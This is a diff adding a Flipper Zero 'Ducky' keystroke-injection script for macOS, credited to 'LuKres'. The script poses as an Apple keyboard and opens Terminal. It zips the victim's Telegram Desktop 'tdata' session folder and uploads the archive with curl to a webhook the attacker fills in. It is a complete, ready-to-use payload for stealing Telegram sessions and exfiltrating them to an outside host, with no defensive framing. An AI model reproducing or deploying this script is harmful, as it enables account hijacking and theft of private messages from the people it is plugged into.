@@ -1,0 +1,19 @@
+ID 05ac:021e Apple:Keyboard
+REM Author: LuKres
+REM Version: 1.0 (Flipper Ducky)
+REM Target: MacOS
+
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 500
+STRING zip -r "/Users/$USER/Library/Application Support/Telegram Desktop/$USER.zip" "/Users/$USER/Library/Application Support/Telegram Desktop/tdata" -x "/Users/$USER/Library/Application Support/Telegram Desktop/tdata/user_data*" -x "/Users/$USER/Library/Application Support/Telegram Desktop/tdata/emoji*" -x "/Users/$USER/Library/Application Support/Telegram Desktop/tdata/dumps*" &>> zip-log
+ENTER
+DELAY 5000
+STRING curl !!!PASTE_WEBHOOK_HERE!!! -F"file1=@/Users/$USER/Library/Application Support/Telegram Desktop/$USER.zip"
+ENTER
+DELAY 5000
+STRING exit
+ENTER
+
